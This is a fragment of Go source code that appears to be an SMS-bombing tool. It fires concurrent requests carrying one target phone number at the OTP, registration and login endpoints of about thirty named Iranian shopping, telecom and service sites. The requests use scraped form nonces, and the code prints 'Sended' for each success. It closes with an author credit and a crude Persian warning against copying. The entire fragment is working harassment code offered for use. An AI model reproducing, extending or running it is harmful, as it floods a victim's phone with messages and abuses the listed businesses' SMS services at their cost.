				payload := map[string]interface{}{
					"mobile":            phone, 
					"email":             "randomuser@example.com", 
					"password":          "SecurePass123!", 
					"rules":             true,
					"is_business":       0,
					"online_chat_token": "", 
				}
				sendJSONRequest(c, ctx, "https://oldpanel.avalpardakht.com/panel/api/v1/auth/register", payload, &wg, ch)
			}
		}(client)

		//masterkala.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				serviceURL := "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp"
				payload := map[string]interface{}{
					"type": "sendotp",
					"phone": phone,
				}
				sendJSONRequest(c, ctx, serviceURL, payload, &wg, ch)
			}
		}(client)
  // naabshop.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("login_digt_countrycode", "+98")
				formData.Set("digits_phone", formatPhoneWithSpaces(phone)) 
				formData.Set("action_type", "phone")
				formData.Set("digits_reg_name", "testname") 
				formData.Set("digits_reg_lastname", "testlastname") 
				formData.Set("digits_process_register", "1")
				formData.Set("sms_otp", "")
				formData.Set("otp_step_1", "1")
				formData.Set("signup_otp_mode", "1")
				formData.Set("rememberme", "1")
				formData.Set("digits", "1")
				formData.Set("instance_id", "27744fbc0c69e6e612567dd63636fde4") 
				formData.Set("action", "digits_forms_ajax")
				formData.Set("type", "login")
				formData.Set("digits_step_1_type", "")
				formData.Set("digits_step_1_value", "")
				formData.Set("digits_step_2_type", "")
				formData.Set("digits_step_2_value", "")
				formData.Set("digits_step_3_type", "")
				formData.Set("digits_step_3_value", "")
				formData.Set("digits_login_email_token", "")
				formData.Set("digits_redirect_page", "//naabshop.com/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
				formData.Set("digits_form", "28e10ee7bd")
				formData.Set("_wp_http_referer", "/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
				formData.Set("show_force_title", "1")
				formData.Set("container", "digits_protected")
				formData.Set("sub_action", "sms_otp")

				sendFormRequest(c, ctx, "https://naabshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)
                //operator-100.ir
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("email", phone)
				sendFormRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", formData, &wg, ch)
			}
		}(client)

		// itmall.ir (Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob")
				formData.Set("countrycode", "+98")
				formData.Set("mobileNo", phone)
				formData.Set("csrf", "e57d035242")
				formData.Set("login", "2")
				formData.Set("username", "")
				formData.Set("email", "")
				formData.Set("captcha", "")
				formData.Set("captcha_ses", "")
				formData.Set("json", "1")
				formData.Set("whatsapp", "0")
				sendFormRequest(c, ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// Mobinnet (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch) 
			}
		}(client)

		// api.ostadkr.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.ostadkr.com/login", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// see5.net (Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone)
				formData.Set("name", "sfsfsfsffsf")
				formData.Set("demo", "bz_sh_fzltprxh")
				sendFormRequest(c, ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
			}
		}(client) 

		// iranicard.ir (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client)

		// miare.ir (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{ 
					"phone_number": phone,
				}, &wg, ch)
			}
		}(client)

		// pezeshket.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
					"mobileNumber": phone,
				}, &wg, ch)
			}
		}(client)

		// bitycle.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
					"phone": phone,
				}, &wg, ch)
			}
		}(client)

		// caropex.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client)

		// bigtoys.ir - Variation 3 (Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action_type", "phone")
				formData.Set("digt_countrycode", "+98")
				formData.Set("phone", strings.TrimPrefix(phone, "0"))
				formData.Set("email", "")
				formData.Set("digits_reg_name", "abcdefghl")
				formData.Set("digits_reg_password", "qzF8w7UAZusAJdg")
				formData.Set("digits_process_register", "1")
				formData.Set("optional_email", "")
				formData.Set("is_digits_optional_data", "1")
				formData.Set("sms_otp", "")
				formData.Set("otp_step_1", "1")
				formData.Set("signup_otp_mode", "1")
				formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222")
				formData.Set("optional_data", "email")
				formData.Set("action", "digits_forms_ajax")
				formData.Set("type", "register")
				formData.Set("dig_otp", "")
				formData.Set("digits", "1")
				formData.Set("digits_redirect_page", "//www.bigtoys.ir/")
				formData.Set("digits_form", "3bed3c0f10")
				formData.Set("_wp_http_referer", "/")
				formData.Set("container", "digits_protected")
				formData.Set("sub_action", "sms_otp")
				sendFormRequest(c, ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// pgemshop.com (POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob")
				formData.Set("countrycode", "+98")
				formData.Set("mobileNo", phone)
				formData.Set("csrf", "0a60a620d9")
				formData.Set("login", "2")
				formData.Set("username", "")
				formData.Set("email", "")
				formData.Set("captcha", "")
				formData.Set("captcha_ses", "")
				formData.Set("json", "1")
				formData.Set("whatsapp", "0")
				sendFormRequest(c, ctx, "https://pgemshop.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// https://pirankalaco.ir/SendPhone.php (Form Data)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("phone", phone)
				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch) 
			}
		}(client) 

		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "refah_send_code")
				formData.Set("mobile", phone)
				formData.Set("security", "placeholder")

				sendFormRequest(c, ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// ubike.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "logini_first")
				formData.Set("login", phone)
				sendFormRequest(c, ctx, "https://ubike.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// www.kanoonbook.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("task", "customer_phone")
				formData.Set("customer_username", phone)
				sendFormRequest(c, ctx, "https://www.kanoonbook.ir/store/customer_otp", formData, &wg, ch) 
			}
		}(client)

		// zzzagros.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "awsa-login-with-phone-send-code")
				formData.Set("nonce", "9a4e9547c3")
				formData.Set("username", phone)
				sendFormRequest(c, ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// gitamehr.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "mreeir_send_sms")
				formData.Set("mobileemail", phone)
				formData.Set("userisnotauser", "")
				formData.Set("type", "mobile")
				formData.Set("captcha", "")
				formData.Set("captchahash", "")
				formData.Set("security", "75d313bc3e")
				sendFormRequest(c, ctx, "https://gitamehr.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// 4hair.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "mreeir_send_sms")
				formData.Set("mobileemail", phone)
				formData.Set("userisnotauser", "")
				formData.Set("type", "mobile")
				formData.Set("captcha", "")
				formData.Set("captchahash", "")
				formData.Set("security", "52771e6d1a")
				sendFormRequest(c, ctx, "https://4hair.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// account724.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "stm_login_register")
				formData.Set("type", "mobile")
				formData.Set("input", phone)
				sendFormRequest(c, ctx, "https://account724.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 
///////////////////////////////////////////////////////////////////////////////////
		// api-atlasmode.alochand.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("version", "new1")
				formData.Set("mobile", phone)
				sendFormRequest(c, ctx, "https://api.alochand.com/v1/customer/register-login?version=new1", formData, &wg, ch) 
			}
		}(client)

		// api.pashikshoes.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone)
				formData.Set("sdlkjcvisl", "uikjdknfs")
				sendFormRequest(c, ctx, "https://api.pashikshoes.com/v1/customer/register-login", formData, &wg, ch) 
			}
		}(client)

		// api.paaakar.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("version", "new1")
				formData.Set("mobile", phone)
				sendFormRequest(c, ctx, "https://api.paaakar.com/v1/customer/register-login?version=new1", formData, &wg, ch) 
			}
		}(client)

		// api.123kif.com Register (Registration/OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"firstName": "users", 
					"lastName": "names", 
					"mobile": phone, 
					"password": "testpassword123", 
					"platform": "web", 
					"refferCode": "", 
				}
				sendJSONRequest(c, ctx, "https://api.123kif.com/api/auth/Register", payload, &wg, ch)
			}
		}(client)

	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
/* coded by @monsmain
⚠️note: copy mamnoe.
❌befahmam copy kardi khahareto migam...*/
